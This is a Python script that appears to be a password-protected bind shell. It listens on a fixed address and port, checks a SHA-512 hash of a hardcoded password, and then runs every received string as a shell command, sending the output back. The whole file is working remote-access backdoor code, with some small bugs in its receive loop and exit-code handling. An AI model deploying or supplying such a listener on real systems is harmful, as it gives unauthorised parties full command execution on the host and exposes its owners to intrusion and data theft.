
import os
import socket
import hashlib
import threading
import subprocess


def passwordChallenge(channel, passwd):

    bufferSize = BUFFER_SIZE

    ciperPassword = hashlib.sha512(passwd.encode()).hexdigest()
    while True:
        rawHashPassword = channel.recv(bufferSize)
        if len(rawHashPassword) < bufferSize:
            break

    # Decode bytes to str
    hashPassword = rawHashPassword.decode()
    
    if hashPassword == ciperPassword:
        response = hashlib.sha512(ciperPassword.encode()).hexdigest()
        channel.sendall(response.encode())
        challenge = True
    
    elif hashPassword != ciperPassword:
        response = b' '
        channel.sendall(response)
        channel.close()
        challenge = False

    return challenge






def serverHandler(channel):


    # Loop on socket.recv
    while True:
    
        try:
            # Define buffer size, can be increased
            bufferSize = BUFFER_SIZE
            
            # While loop to complete socket buffer in recv 
            while True:
                rawRequest = channel.recv(bufferSize)
                if len(rawRequest) < bufferSize:
                    break
            # Decode bytes to str
            clientRequest = rawRequest.decode()

            # If 'cd' command send
            if clientRequest.split(' ')[0] == 'cd':
                workingDir = clientRequest.split(' ')[1]
                if os.path.isdir(workingDir):
                    os.chdir(workingDir)
                    # Return empty output, to not block the remote shell
                    output = ' '
                else:
                    output = f"{workingDir} doesn'nt exist\n"

                channel.sendall(output.encode())
            
            # Else execute shell command
            else:
                workingDir = os.getcwd()
                output = shellCommand(clientRequest, workingDir)
                channel.sendall(output)

        except KeyboardInterrupt:
            channel.close()
            exit()

        except Exception as error:
            print(f"[!] {error}")
            exit()

    




def shellCommand(command, cwd):

    # Easy command, with no output handler
    #output = subprocess.check_output(command, shell=True, stderr=STDOUT)

    # Complete shell command, with pipe to get STDOUT, STDERR
    shellCommand = subprocess.Popen(

        str(command),
        cwd=cwd,
        shell=True, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        stdin=subprocess.PIPE
    )
    
    # Get exit code
    exitCode = shellCommand.returncode
    # Parse STDOUT and STDERR
    STDOUT, STDERR = shellCommand.communicate()

    # If not STDOUT and STDERR, return STDERR in remote shell
    if not STDOUT and STDERR:
        shellOutput = STDERR
    # If STDOUT and not STDERR, return STDOUT in remote shell
    elif not STDERR and STDOUT:
        shellOutput = STDOUT
    # Else, return an empty str (in case of system command touch/rm/cat...)
    else:
        shellOutput = b' '

    return shellOutput

# ------------------------------------------------------------------------------
# ------------------------------------------------------------------------------
# ------------------------------------------------------------------------------

BUFFER_SIZE = 1024

bindPort = 1234
bindAddress = '10.0.10.110'
password = 'Py314!'
#cipherPassword = hashlib.sha512(password.encode()).hexdigest()

serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

serverSocket.bind((bindAddress, bindPort))
serverSocket.listen(5)

print(f"[?] Listening on {bindAddress}:{bindPort}")

while True:

    try:

        channel, cliAddress = serverSocket.accept()
        print(f"[+] Received Connection from {cliAddress[0]}")
        challenge = passwordChallenge(channel, password)
        if challenge is True:
            print('Password match')
            serverHandler(channel)
        elif challenge is False:
            print("Password doesn't match")
            channel.close()


    except KeyboardInterrupt:
        serverSocket.close()
        exit()
        
        
    except Exception as error:
        print(f"[+] {error}")
        serverSocket.close()
        exit()

